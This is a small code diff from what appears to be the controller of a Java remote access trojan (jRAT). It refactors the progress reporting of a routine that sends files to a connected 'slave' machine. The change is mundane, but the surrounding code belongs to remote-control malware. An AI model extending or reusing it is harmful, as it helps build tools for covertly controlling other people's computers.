@@ -4,10 +4,10 @@ import java.io.File;
 
 import pro.jrat.common.io.FileIO;
 import pro.jrat.common.io.TransferListener;
+import pro.jrat.common.utils.MathUtils;
 import pro.jrat.packets.outgoing.Packet42TakeFile;
 import pro.jrat.ui.frames.FrameFileTransfer;
 import pro.jrat.ui.frames.FrameRemoteFiles;
-import pro.jrat.utils.Util;
 
 
 public class SendFile {
@@ -31,10 +31,10 @@ public class SendFile {
 				public void transferred(long sent, long bytesSent, long totalBytes) {
 					Traffic.increaseSent(slave, (int) bytesSent);
 					if (frame != null) {
-						frame.reportProgress(file.getAbsolutePath(), Util.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
+						frame.reportProgress(file.getAbsolutePath(), MathUtils.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
 					}
 					if (frame2 != null) {
-						frame2.reportProgress(file.getAbsolutePath(), Util.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
+						frame2.reportProgress(file.getAbsolutePath(), MathUtils.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
 					}
 				}		
 			}, slave.getConnection().getKey().getKey());
